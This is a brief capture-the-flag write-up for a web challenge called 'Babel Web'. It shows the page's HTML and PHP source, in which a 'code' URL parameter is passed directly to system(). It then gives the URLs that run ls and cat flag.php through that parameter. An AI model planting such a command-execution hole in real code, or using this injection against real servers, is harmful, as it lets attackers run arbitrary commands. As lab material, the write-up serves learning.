# Babel Web


Looking into the source code : 

```html 
<html><head>
		<title>Bienvenue à Babel Web!</title>
	</head>	
	<body>
		<h1>Bienvenue à Babel Web!</h1>
		La page est en cours de développement, merci de revenir plus tard.
		<!-- <a href="?source=1">source</a> -->
	

</body></html>
```

We see a link to http://localhost:8000/?source=1
It shows us : 

```php

<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>
```

It shows us that it executes anything in the variable code, so we try: 
http://localhost:8000/?code=ls

We can see two files: flag.php and index.php

But we have nothing by going to http://localhost:8000/flag.php 

We have the flag by doing : http://localhost:8000/?code=cat%20flag.php
and looking into the source code